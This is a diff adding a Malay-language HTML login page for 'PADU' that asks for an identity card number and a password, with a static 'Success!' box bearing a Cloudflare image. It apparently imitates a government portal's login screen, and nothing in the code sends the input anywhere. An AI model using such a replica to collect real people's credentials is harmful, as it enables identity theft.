@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <button class="close-button" onclick="closeWindow()">X</button>  
+        <form action="#" method="post" class="login-form">
+            <h2>Log Masuk ke PADU</h2>
+
+            <input type="text" id="idNumber" name="idNumber" placeholder="No. Kad Pengenalan*" required>
+
+            <input type="password" id="password" name="password" placeholder="Kata Laluan*" required>
+            
+            <div class="success-box">
+                <img src="image/check.jpg" alt="check image" class="check-image">
+                <p>Success!</p>
+                <img src="image/cloudflare.jpg" alt="cloudflare Image" class="cloudflare-image">
+            </div>
+            <br>
+            <a href="reset.html">Reset/Lupa kata laluan?</a>
+            <a href="daftar.html">Daftar pengguna baru</a>
+            <p>
+                Dengan meneruskan, anda bersetuju dengan<br>
+                <a href="syarat.html">Terma dan syarat</a> berkaitan dasar privasi dan
+                keselamatan kami
+            </p>
+
+            <div class="button-container">
+                <button class="red-button" type="button">Tutup</button>
+                <button class="blue-button" type="submit">Log Masuk</button>
+            </div>
+
+        </form>
+    </div>
+</body>
+</html>
